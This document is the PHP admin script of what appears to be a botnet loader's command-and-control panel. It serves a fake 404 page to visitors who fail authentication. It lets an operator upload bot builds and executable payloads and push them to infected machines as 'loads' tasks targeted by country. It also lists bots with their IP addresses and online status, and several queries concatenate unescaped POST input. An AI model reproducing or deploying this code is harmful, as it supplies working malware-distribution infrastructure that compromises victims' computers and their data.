<?php
error_reporting(0);
require('../config.php');
if((!isset($_SERVER['PHP_AUTH_USER'])) || !(($_SERVER['PHP_AUTH_USER'] == ROOT_LOGIN) && ($_SERVER['PHP_AUTH_PW'] == ROOT_PASSW))){
  header("WWW-Authenticate: Basic entrer='Form2txt admin'");
  header("WWW-Authenticate: Basic Realm=Admin");
  header("HTTP/1.0 401 Unauthorized");
  echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL '.$_SERVER['PHP_SELF'].' was not found on this server.</p>
    </body></html>';
  die();
}
require('../sys/mysql_class.php');
$db=new db;
$db->connect(DB_USER,DB_PASS,DB_NAME);

if($_FILES['path']){
  #sleep(1);
  $target_path = "../load/build.exe";
  $build = time();
  if(move_uploaded_file($_FILES['path']['tmp_name'], $target_path)) {
    $f = fopen('../load/ver.txt','w');
    fwrite($f,floatval($_POST['version']).":".$build);
    fclose($f);
    echo '{success:true, file:'.JEncode($_FILES['path']['name']).', build: '.JEncode(date('H:i:s d-m-Y',$build)).', ver:'.JEncode(floatval($_POST['version'])).'}';
  }else{
    echo "{failure:true}";
  }
  die();
}

$task = '';
if(isset($_POST['task'])){
  $task = $_POST['task'];
}
#$task = $_GET['task'];
switch($task){

/****************************************************************************************************************
*                                 B O T S
****************************************************************************************************************/
    case "LISTING":
        getList();
    break;

    case "BOTS":
        printBots();
    break;

/****************************************************************************************************************
*                                 L O A D S    T A S K
****************************************************************************************************************/

    case "LOADS":
        LoadsTasks();
    break;

    case "CREATE_LOADS":
        createLoads();
    break;

    case "UPDATE_LOADS":
        updateLoads();
    break;

    case "DELETE_LOADS":
        deleteLoads();
    break;

    case "COUNTRY_LIST":
    CountryList();
    break;

    case "VERSION_LIST":
    VersionList();
    break;


/****************************************************************************************************************
*                                 S T A T S
****************************************************************************************************************/
    case "STATS":
        printStats();
    break;

    case "CLEAR_ALL":
        clear_all();
    break;

    case "CLEAR_WORK":
        clear_work();
    break;

    case "GETVERSION":
        getVersion();
    break;

/****************************************************************************************************************
*                                 S T A T U S
****************************************************************************************************************/

    case 'STATUS':
      if(LANGUAGE == 'en'){
        echo "[['0','No Active'],['1','Active']]";
      }else{
        echo "[['0','�� �������'],['1','�������']]";
      }
    break;

    case 'STOP_UPDATE':
      $f = fopen('../load/ver.txt','w');
      fwrite($f,floatval($_POST['version']).":0000000000");
      fclose($f);
      $data = explode(":",file_get_contents('../load/ver.txt'));
      echo floatval($data[0]).' build: '.date("H:i:s d-m-Y",$data[1]);
    break;

    default:
        echo "{failure:true}";
    break;
}

/****************************************************************************************************************
*                                 F U N C T I O N
****************************************************************************************************************/

function getVersion(){
  $data = explode(":",file_get_contents('../load/ver.txt'));
  echo '{success:true, "results":[{"version":"'.floatval($data[0]).'","build":"'.date("H:i:s d-m-Y",$data[1]).'"}]}';
}

function clear_all(){
  global $db;
  $db->query("TRUNCATE TABLE `".PREFIX."_bots`"); $db->free();
  $db->query("TRUNCATE TABLE `".PREFIX."_work`"); $db->free();
  echo "1";
}

function clear_work(){
  global $db;
  $db->query("TRUNCATE TABLE `".PREFIX."_work`"); $db->free();
  $db->query("UPDATE `".PREFIX."_bots` SET `status`='0'"); $db->free();
  echo "1";
}

function procent($all,$val){
 return intval(($val/$all)*100);
}

function LoadsTasks(){
  global $db;
  $query = "SELECT *,`status` AS 'IDstatus' FROM `".PREFIX."_tasks_loads`";
  // Here we check if we have a query parameter :
  if (isset($_POST['query'])){
        $query .= " WHERE `name` LIKE '%".$_POST['query']."%' OR `file` LIKE '%".$_POST['query']."%'";
  }
  //echo $query;
  $result = $db->query($query);
  $nbrows = $db->num_rows($result);
  $start = intval($_POST['start']);
  $end = (((intval($_POST['limit']) == 0))?'15':intval($_POST['limit']));
  $limit = $query." LIMIT ".$start.",".$end;
  $result = $db->query($limit);
  if($nbrows>0){
    while($rec = $db->get_row($result)){
       #print_r($rec);
      // render the right date format
      if(LANGUAGE == 'ru' && $rec['IDstatus'] == 0){ $rec['status'] = iconv('WINDOWS-1251','UTF-8','�� �������'); }else{ $rec['status'] = iconv('WINDOWS-1251','UTF-8','�������'); }
      if(LANGUAGE == 'en' && $rec['IDstatus'] == 0){ $rec['status'] = iconv('WINDOWS-1251','UTF-8','No Active'); }else{ $rec['status'] = iconv('WINDOWS-1251','UTF-8','Active'); }
      $tasks = $db->super_query("SELECT count(`id`) AS 'count' FROM `".PREFIX."_work` WHERE `type`='loads' AND `cid`='".$rec['id']."'");

      $query = "SELECT count(`id`) AS 'count' FROM `".PREFIX."_bots`";
      $rules = explode(",",$rec['rules']);
      if(count($rules) > 0 && $rec['rules'] != '*'){
    for($i=0;$i<count($rules);$i++){
      if($rules[$i][0] == '!'){
        $query .= " OR NOT `country`='".$rules[$i]."'";
      }else{
        $query .= " OR `country`='".$rules[$i]."'";
      }
    }
      }
      $bots = $db->super_query($query);
      if($bots['count'] > $rec['limit'] || $rec['limit'] == 0){
        $rec['count'] = procent($bots['count'],intval($tasks['count']));
      }else{
        $rec['count'] = procent($rec['limit'],intval($tasks['count']));
      }
      $rec['load'] = intval($tasks['count']);
      $arr[] = $rec;
    }
    $db->free();
    #print_r($arr);
    $jsonresult = JEncode($arr);
    echo '({"total":"'.$nbrows.'","results":'.$jsonresult.'})';
  } else {
    echo '({"total":"0", "results":""})';
  }
}

function updateLoads(){
  global $db;
  $name = $db->safesql($_POST['name']);
  $limit = intval($_POST['limit']);
  $rules = $db->safesql($_POST['rules']);
  $referer = $db->safesql($_POST['referer']);
  $status = iconv('UTF-8','WINDOWS-1251',$_POST['status']);
  switch($status){
      case 'No Active': $status = '0'; break;
      case '�� �������': $status = '0'; break;
      case '0': $status = '0'; break;
      case 'Active': $status = '1'; break;
      case '�������': $status = '1'; break;
      case '1': $status = '1'; break;
      default: $status = '0'; break;
  }
  $result = $db->query("UPDATE `".PREFIX."_tasks_loads` SET `name`='".$name."',`limit`=".$limit.",`rules`='".$rules."',`referer`='".$referer."',`status`='".$status."' WHERE `id`=".intval($_POST['id'])); $db->free();
  echo '1';
}

function createLoads(){
  global $db;
  $name = $db->safesql($_POST['name']);
  $limit = intval($_POST['limit']);
  $all = array();
  if(empty($_POST['selectall'])){
    $rules = explode(",",str_replace("!Please select...,","",$db->safesql($_POST['blacklist'])));
    if(count($rules) > 0){
      for($i=0;$i<count($rules);$i++){
        $all[] = '!'.$rules[$i];
      }
    }
    $rules = explode(",",str_replace("!Please select...,","",$db->safesql($_POST['whitelist'])));
    if(count($rules) > 0){
      $all = array_merge($all,$rules);
    }
  }else{
    $all[] = '*';
  }
  $rules = implode(',',$all);
  if(empty($_POST['url'])){
    preg_match_all("#[a-z0-9-_]+#i",$name,$arr);
    $ext = explode(".",$_FILES['loadfile']['name']);
    $ext = $ext[(count($ext)-1)];
    if($ext == 'exe' || $ext == 'com' || $ext == 'dll' || $ext == 'src'){
      $file = implode('',$arr[0])."_".$_FILES['loadfile']['name'];
      @move_uploaded_file($_FILES['loadfile']['tmp_name'], '../load/'.$file);
      chmod('../load/'.$file,0777);
    }else{
      die('{failure:true}');
    }
  }else{
      $file = $db->safesql($_POST['url']);
  }
  $referer = $db->safesql($_POST['referer']);
  $result = $db->query("INSERT INTO `".PREFIX."_tasks_loads` (`id`,`name`,`limit`,`rules`,`file`,`referer`,`status`) VALUES ('','".$name."',".$limit.",'".$rules."','".$file."','".$referer."','1')"); $db->free();
  echo '{success:true}';
}

function deleteLoads(){
   global $db;
   $ids = $_POST['ids'];
   $idpres = JDecode(stripslashes($ids));

    // Make a single query to delete all of the Tasks at the same time :
    if(sizeof($idpres)<1){
      echo '0';
    } else if (sizeof($idpres) == 1){
      $load = $db->super_query("SELECT `file` FROM `".PREFIX."_tasks_loads` WHERE `id`=".$idpres[0]);
      @unlink('../load/'.$load['file']);
      $db->query("DELETE FROM `".PREFIX."_tasks_loads` WHERE `id` = ".$idpres[0]);
      $db->query("DELETE FROM `".PREFIX."_work` WHERE `type`='loads' AND `cid` = ".$idpres[0]);
    } else {
      $query = "DELETE FROM `".PREFIX."_tasks_loads` WHERE ";
      for($i = 0; $i < sizeof($idpres); $i++){
         $load = $db->super_query("SELECT `file` FROM `".PREFIX."_tasks_loads` WHERE `id`=".$idpres[$i]);
         @unlink('../load/'.$load['file']);
         $query = $query . "`id` = ".$idpres[$i];
         if($i<sizeof($idpres)-1){
            $query = $query . " OR ";
         }
      }
      $db->query($query); $db->free();
      $db->query("DELETE FROM `".PREFIX."_work` WHERE `type`='loads' AND `cid` = ".$idpres[0]); $db->free();
    }

    // echo $query;  This helps me find out what the heck is going on in Firebug...
    echo '1';
}

function printStats(){
    global $db;
    $allbots = $db->super_query("SELECT count(`id`) AS 'count' FROM `".PREFIX."_bots`");
    $country = $db->query("SELECT count(`id`) AS 'count' FROM `".PREFIX."_bots` GROUP BY `country`");
    $onlinebots = $db->super_query("SELECT count(`id`) AS 'count' FROM `".PREFIX."_bots` WHERE `lasttime`>='".date("Y-m-d H:i:s",time()-1800)."'");
    $active12bots = $db->super_query("SELECT count(`id`) AS 'count' FROM `".PREFIX."_bots` WHERE `lasttime`>='".date("Y-m-d H:i:s",time()-43200)."'");
    $active24bots = $db->super_query("SELECT count(`id`) AS 'count' FROM `".PREFIX."_bots` WHERE `lasttime`>='".date("Y-m-d H:i:s",time()-86400)."'");
    $alltask = $db->super_query("SELECT count(`id`) AS 'count' FROM `".PREFIX."_tasks_loads`");
    $waittask = $db->super_query("SELECT count(`id`) AS 'count' FROM `".PREFIX."_tasks_loads` WHERE `status`='0'");
    $arr[] = array('param'=>'All bots:','value'=>intval($allbots['count']));
    $arr[] = array('param'=>'OnLine/OffLine:','value'=>intval($onlinebots['count'])." (".procent(intval($allbots['count']),intval($onlinebots['count']))."%) / ".intval($allbots['count']-$onlinebots['count'])." (".procent(intval($allbots['count']),intval($allbots['count']-$onlinebots['count']))."%)");
    $arr[] = array('param'=>'Active 12hours:','value'=>intval($active12bots['count']));
    $arr[] = array('param'=>'Active 24hours:','value'=>intval($active24bots['count']));
    $arr[] = array('param'=>'Country:','value'=>intval($db->num_rows($country)));
    $arr[] = array('param'=>'All Task:','value'=>intval($alltask['count']));
    $arr[] = array('param'=>'Work/Stop Task:','value'=>intval($alltask['count']-$waittask['count'])." (".procent(intval($alltask['count']),intval($alltask['count']-$waittask['count']))."%) / ".intval($waittask['count'])." (".procent(intval($alltask['count']),intval($waittask['count']))."%)");

    $jsonresult = JEncode($arr);
    echo '({"total":'.count($arr).', "results":'.$jsonresult.'})';
}

function printBots(){
    global $db;
    $query = "SELECT * FROM `".PREFIX."_bots`";
    if (isset($_POST['query'])){
      $query .= " WHERE `id` LIKE '%".$_POST['query']."%' OR `ip` LIKE '%".$_POST['query']."%' OR `country` LIKE '%".$_POST['query']."%'";
    }
    if(isset($_POST['dir']) && isset($_POST['sort'])){
      $query .= " ORDER BY `".$_POST['sort']."` ".$_POST['dir'];
    }
    $start = intval($_POST['start']);
    $end = (intval($_POST['limit'] == 0) ? intval($_POST['limit']) : 100);
    $limit = $query." LIMIT ".$start.",".$end;

    $allbot = $db->query($query);
    $allbots['count'] = $db->num_rows($allbot);
    $db->free();
    $result = $db->query($limit);
    require('../geoip/geoip.inc');
    if($allbots['count'] > 0){
      $bot['cid'] = 0;
      while($bot = $db->get_row($result)){
        $bot['status'] = 0;
        $loads = '';
        $tasks = $db->query("SELECT count(`".PREFIX."_work`.`id`) AS 'count',`".PREFIX."_tasks_loads`.`name` FROM `".PREFIX."_work`,`".PREFIX."_tasks_loads` WHERE `".PREFIX."_work`.`cid`=`".PREFIX."_tasks_loads`.`id` AND `".PREFIX."_work`.`botid`='".$bot['uid']."' AND `".PREFIX."_work`.`type`='loads' GROUP BY `cid`");
        while($task = $db->get_row($tasks)){ $bot['cid']+= $task['count']; $loads .= '<a href="javascript:LoadListingWindow.show();LoadListingWindow.focus();" class="list-bot-info">'.$task['name'].'</a>; '; } $db->free();
        if(!empty($loads)){ $bot['tasks'] .= '<br><b>Loads task:</b> '.$loads; }
        # ��������� ������
        $bot['tasks'] = "<b>All task: ".$bot['cid']."</b>".$bot['tasks'];
    $v = explode(':',$bot['ver']);
    #$bot['ver'] =
        $arr[] = array('ID'=>$bot['id'], 'country'=>$bot['country']."|".$GEOIP_COUNTRY_NAMES[$GEOIP_COUNTRY_CODE_TO_NUMBER[$bot['country']]], 'ip'=>$bot['ip'], 'cid'=>$bot['cid'], 'regtime'=>$bot['regtime'], 'lasttime'=>$bot['lasttime'], 'tasks'=>$bot['tasks'], 'ver'=>"[".$v[0]."] ".date('H:i:s d-m-Y',$v[1]));
      }
      $db->free();
      #$alltask = $db->super_query("SELECT count(`id`) AS 'alltask' FROM `tasks`");
      $jsonresult = JEncode($arr);
      echo '({"total":"'.$allbots['count'].'", "results":'.$jsonresult.'})';
    }else{
      echo '({"total":"0", "results":""})';
    }
}

function CountryList(){
  require('../geoip/geoip.inc');
  $res = array();
  $i=0;
  foreach ($GEOIP_COUNTRY_CODES as $code) {
    if($i==0){ $i++; continue; }
    $res[] = '["'.$code.'","'.$GEOIP_COUNTRY_NAMES[$GEOIP_COUNTRY_CODE_TO_NUMBER[$code]].'"]';
  }
  echo str_replace(array("\r","\n"),"","[".implode(',',$res)."]");
}

function VersionList(){
  global $db;
  $res = array();
  $result = $db->query("SELECT SUBSTRING_INDEX(`ver`,':',1) as 'ver' FROM `".PREFIX."_bots` GROUP BY SUBSTRING_INDEX(`ver`,':',1)");
  while($ver = $db->get_row($result)){
     $res[] = '["'.$ver['ver'].'","'.$ver['ver'].'"]';
  }
  echo "[".implode(',',$res)."]";
}

function JEncode($arr){
  if (version_compare(PHP_VERSION,"5.2","<")){
    require('../sys/json_class.php');
    $json = new Services_JSON();
    $data=$json->encode($arr);
  }else{ $data = json_encode($arr); }
  return $data;
}
function JDecode($arr){
  if (version_compare(PHP_VERSION,"5.2","<")){
    require('../sys/json_class.php');
    $json = new Services_JSON();
    $data=$json->decode($arr);
  }else{ $data = json_decode($arr); }
  return $data;
}

// Encodes a YYYY-MM-DD into a MM-DD-YYYY string
function codeDate($date) {
  $tab = explode ("-", $date);
  $r = $tab[0]."/".$tab[1]."/".$tab[2];
  return $r;
}

$db->close();
?>
